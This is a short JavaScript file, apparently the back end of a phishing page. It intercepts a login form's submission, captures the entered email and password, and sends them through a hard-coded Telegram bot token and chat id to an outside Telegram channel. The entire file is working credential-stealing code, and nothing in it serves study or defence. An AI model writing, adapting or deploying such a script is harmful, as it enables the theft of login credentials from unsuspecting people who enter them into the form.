const form = document.querySelector('form')

form.addEventListener("submit", (event) => {
  event.preventDefault() ;

  var text1 = document.getElementById("email").value;
  var text2 = document.getElementById("password").value;


  var token = "5581556739:AAF1dhcL75uabSxgVqPK1SeztTL9AUGXns0"

  var my_text = `Result is: - Email: ${text1} , Password: ${text2}`

  var chat_id = -1001713589407

  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`


  var api = new XMLHttpRequest()
  api.open("GET",url,true);
  api.send();

  console.log("succesfully sended");
})